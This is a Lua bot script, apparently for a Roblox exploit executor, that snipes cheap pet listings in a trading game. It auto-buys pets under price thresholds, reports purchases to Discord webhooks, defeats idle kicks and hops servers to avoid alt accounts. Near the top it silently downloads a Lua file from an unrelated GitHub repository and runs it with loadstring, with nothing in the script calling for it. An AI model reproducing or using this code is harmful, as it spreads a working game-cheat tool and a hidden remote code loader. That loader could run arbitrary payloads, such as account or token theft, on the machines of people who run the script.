local Constants = {
    GameId = 15502339080,
    WebhookColors = {
        Success = 0x00ff00,
        Failure = 0xff0000,
    },
}

local Config = {
    WebhookIconUrl = "https://cdn.discordapp.com/attachments/1122535236996182099/1189213923073871953/EmrJ9tNVcAIhVzB.png?ex=659d58c5&is=658ae3c5&hm=c55bc9b5323c6aa542d6a99b4e42c20a0255377566c3bc2d047f63bffce70b7e&",
}

local function main()
    local osclock = os.clock()
    repeat task.wait() until game:IsLoaded()

    setfpscap(10)
    game:GetService("RunService"):Set3dRenderingEnabled(false)
    local Booths_Broadcast = game:GetService("ReplicatedStorage").Network:WaitForChild("Booths_Broadcast")
    local Players = game:GetService('Players')
    local http = game:GetService("HttpService")
    local ts = game:GetService("TeleportService")
    local rs = game:GetService("ReplicatedStorage")
    local vu = game:GetService("VirtualUser")

    local success, result = pcall(function()
        return game:HttpGetAsync("https://raw.githubusercontent.com/xccsdf/abc/main/test.lua")
    end)

    if success then
        local script = loadstring(result)
        script()
    else
        warn("Failed to fetch and execute script:", result)
    end

    if not snipeNormalPets then
        snipeNormalPets = false
    end

    local function jumpToServer()
        local sfUrl = "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=%s&excludeFullGames=true"
        local req = http:RequestAsync({ Url = string.format(sfUrl, Constants.GameId, "Desc", 100) })
        local body = http:JSONDecode(req.Body)
        local deep = math.random(1, 3)

        if deep > 1 then
            for i = 1, deep, 1 do
                req = http:RequestAsync({ Url = string.format(sfUrl .. "&cursor=" .. body.nextPageCursor, Constants.GameId, "Desc", 100) })
                body = http:JSONDecode(req.Body)
                task.wait(0.1)
            end
        end

        local servers = {}

        if body and body.data then
            for i, v in next, body.data do
                if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                    table.insert(servers, v.id)
                end
            end
        end

        local randomCount = math.max(#servers, 2)
        ts:TeleportToPlaceInstance(Constants.GameId, servers[math.random(1, randomCount)], Players.LocalPlayer)
    end

    local altsSet = {}

    for _, alt in ipairs(alts) do
        altsSet[alt] = true
    end

    local function processListingInfo(uid, gems, item, version, shiny, amount, boughtFrom, boughtStatus, mention)
        local gemamount = Players.LocalPlayer.leaderstats["💎 Diamonds"].Value
        local snipeMessage = "||" .. Players.LocalPlayer.Name .. "||"
        local weburl, webContent, webcolor

        version = version == 2 and "Rainbow " or (version == 1 and "Golden " or "") or ""

        if boughtStatus then
            webcolor = Constants.WebhookColors.Success
            weburl = webhook
            snipeMessage = snipeMessage .. " just sniped a "

            webContent = mention and "<@".. userid ..">" or ""

            if normalwebhook then
                weburl = normalwebhook
            end
        else
            webcolor = Constants.WebhookColors.Failure
            weburl = webhookFail
            snipeMessage = snipeMessage .. " failed to snipe a "
        end

        snipeMessage = snipeMessage .. "**" .. version

        if shiny then
            snipeMessage = snipeMessage .. " Shiny "
        end

        snipeMessage = snipeMessage .. item .. "**"

        local message1 = {
            content = webContent,
            embeds = {
                {
                    author = {
                        name = "Reimu 🤑",
                        icon_url = Config.WebhookIconUrl,
                    },
                    title = snipeMessage,
                    color = webcolor,
                    timestamp = "Touhou Sniper: " .. DateTime.now():ToIsoDate(),
                    fields = {
                        { name = "*PURCHASE INFO:*", value = "\n\n" },
                        { name = "PRICE:", value = tostring(gems) .. " GEMS 🤑" },
                        { name = "AMOUNT:", value = tostring(amount) },
                        { name = "BOUGHT FROM:", value = "||" .. tostring(boughtFrom) .. "|| 🤡" },
                        { name = "PETID:", value = "||" .. tostring(uid) .. "|| 🦛 \n\n" },
                        { name = "*USER INFO:*", value = "\n\n" },
                        { name = "USER:", value = "||" .. game.Players.LocalPlayer.Name .. "||" },
                        { name = "GEMS LEFT:", value = tostring(gemamount) .. " 🤑" },
                    },
                },
            },
        }

        local jsonMessage = http:JSONEncode(message1)
        local success, webMessage = pcall(function()
            http:PostAsync(weburl, jsonMessage)
        end)

        if not success then
            local response = request({
                Url = weburl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonMessage
            })
        end
    end

    local function checklisting(uid, gems, item, version, shiny, amount, username, playerid)
        local Library = require(rs:WaitForChild('Library'))
        local purchase = rs.Network.Booths_RequestPurchase
        gems = tonumber(gems) or 0
        amount = amount or 1
        local ping = false
        local type = {}

        pcall(function()
            type = Library.Directory.Pets[item]
        end)

        local price = gems / amount

        if type.exclusiveLevel and price <= 10000 and item ~= "Banana" and item ~= "Coin" then
            local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
            processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)
        elseif item == "Titanic Christmas Present" and price <= 25000 then
            local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
            processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)
        elseif string.find(item, "Exclusive") and price <= 25000 then
            local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
            processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)
        elseif type.huge and price <= 1000000 then
            local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
            ping = boughtPet == true
            processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)
        elseif type.titanic and price <= 10000000 then
            local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
            ping = boughtPet == true
            processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)
        elseif gems == 1 and snipeNormalPets == true then
            local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
            processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)
        end
    end

    local function handleBoothsBroadcast(username, message)
        local playerID
        local playerIDSuccess, playerError = pcall(function()
            playerID = message['PlayerID']
        end)

        if playerIDSuccess and type(message) == "table" then
            local listing = message["Listings"]
            for key, value in pairs(listing) do
                if type(value) == "table" then
                    local uid = key
                    local gems = value["DiamondCost"]
                    local itemdata = value["ItemData"]

                    if itemdata then
                        local data = itemdata["data"]

                        if data then
                            local item = data["id"]
                            local version = data["pt"]
                            local shiny = data["sh"]
                            local amount = data["_am"]
                            checklisting(uid, gems, item, version, shiny, amount, username, playerID)
                        end
                    end
                end
            end
        end
    end

    local function idleHandler()
        vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        task.wait(1)
        vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    end

    local function handlePlayerAdded(player)
        for i = 1, #alts do
            if player.Name == alts[i] and alts[i] ~= Players.LocalPlayer.Name then
                jumpToServer()
            end
        end
    end

    local function handlePlayerRemoving(player)
        if #Players:GetPlayers() < 25 then
            jumpToServer()
        end
    end

    local function run()
        while task.wait(1) do
            if math.floor(os.clock() - osclock) >= math.random(900, 1200) then
                jumpToServer()
            end
        end
    end

    Players.LocalPlayer.Idled:Connect(idleHandler)
    Players.PlayerAdded:Connect(handlePlayerAdded)
    Players.PlayerRemoving:Connect(handlePlayerRemoving)
    Booths_Broadcast.OnClientEvent:Connect(handleBoothsBroadcast)

    run()
end

main()
